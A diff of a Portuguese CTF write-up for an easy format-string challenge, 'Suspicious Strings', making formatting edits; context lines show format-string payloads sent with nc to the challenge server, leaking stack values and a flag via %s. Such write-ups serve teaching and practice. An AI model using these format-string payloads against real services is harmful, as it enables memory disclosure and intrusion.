@@ -1,7 +1,7 @@
 # **PWN**
 
 **Autor**: Hakal  
-**Desafio**: Suspicious Strings
+**Desafio**: Suspicious Strings  
 **Nível**: Fácil  
 
 ---
@@ -45,7 +45,6 @@ echo -e '%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x' | nc suspicious-strings.chapeu
 
 ![Exploração da Pilha com Format String](1.png)
 
-
 ---
 
 ### **Passo 2: Acessando strings na memória com %s**
@@ -60,17 +59,13 @@ echo -e '%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%s' | nc suspicious-string
 
 **Saída:**
 
-```
-ae78a4d1.fbad2088.51875b2f.ae78a500.00000000.35ebe238.00c00000.00010000.ae7892a0.flag{f0rm4t_str1ng_1s_4w3s0m3}
-```
+![Acessando strings na memória com %s](2.png)
 
 **Análise:**
 
 - Os primeiros valores (`ae78a4d1`, `fbad2088`, etc.) são dados que continuam sendo lidos da pilha.
 - O valor mais importante é o último: `ae7892a0`. Esse valor representa um **ponteiro** que aponta para uma string armazenada na memória.
 - O especificador `%s` utilizou esse ponteiro para acessar e exibir o conteúdo da memória. A string recuperada foi a **flag**: `flag{f0rm4t_str1ng_1s_4w3s0m3}`.
-
-![Acessando strings na memória com %s](2.png)
 
 ---
 
@@ -100,7 +95,7 @@ ae78a4d1.fbad2088.51875b2f.ae78a500.00000000.35ebe238.00c00000.00010000.ae7892a0
 
 ---
 
-## **5. Conclusão – Passo a Passo para Exploração**
+## **5. Conclusão**
 
 Aqui está o processo passo a passo que foi seguido para explorar a vulnerabilidade de **format string** e extrair a flag:
 
